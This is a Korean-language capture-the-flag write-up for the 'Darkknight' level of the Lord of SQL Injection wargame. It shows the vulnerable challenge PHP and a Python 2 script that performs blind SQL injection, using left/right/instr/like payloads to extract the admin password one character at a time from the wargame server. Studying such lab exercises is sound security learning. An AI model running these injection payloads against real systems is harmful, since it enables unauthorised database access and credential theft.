---
layout: default
title: Darknight
parent: Load Of SQL Injection
nav_order: 12
---

# Darknight

작은 따옴표가 필터링되기 때문에 no 부분에서만 SQL Injection을 진행할 수 있다.

substr이 필터링되기 때문에 left함수와 right함수를 이용해 풀 수 있다.

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
  if(preg_match('/\'|substr|ascii|=/i', $_GET[no])) exit("HeHe"); 
  $query = "select id from prob_darkknight where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_darkknight where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("darkknight"); 
  highlight_file(__FILE__); 
?>
```

python으로 툴을 짜 pw를 가져올 수 있다.

```python
import urllib, urllib2, cookielib, re, ssl
key=''
length=0
cj = cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
opener.addheaders={('User-agent','Mozila/5.0(compatible;MSIE 5.5;Windows NT)')}

loginUrl2='https://los.eagle-jump.org/?login'
login_form={"id":"los_id","pw":"los_pw"}
login_form=urllib.urlencode(login_form)
reqLogin = opener.open('https://los.eagle-jump.org/?login',login_form)
url = 'https://los.eagle-jump.org/gate.php'
req=opener.open(url)

print 'start Blind SQL Injection'
print "search key's length"
while 1:
    length=length+1
    url = 'https://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?no=2 or instr(id,"admin") and length(pw) like %d'%(length)
    print url
    resp=opener.open(url)
    rresp=resp.read()
    find=re.findall("Hello admin",rresp)
    if find:
        break
print length

print 'search key.'
lenck=1
while 1:
    subkey = 31
    for x in range(96):
        subkey=subkey+1
        hexkey=hex(subkey)
	if hexkey=="0x25":
		subkey=subkey+1
		hexkey=hex(subkey)
        url='https://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?no=2 or instr(id,"admin") and right(left(pw,%d),1)like %s' %(lenck,hexkey)
        print url
        resp=opener.open(url)
        rresp=resp.read()
        find=re.findall("Hello admin",rresp)
        if find:
            print 'find'
            key=key+chr(subkey)
            break
    lenck=lenck+1
    if lenck-1==length:
        break

print 'find key.'
print key.lower()

```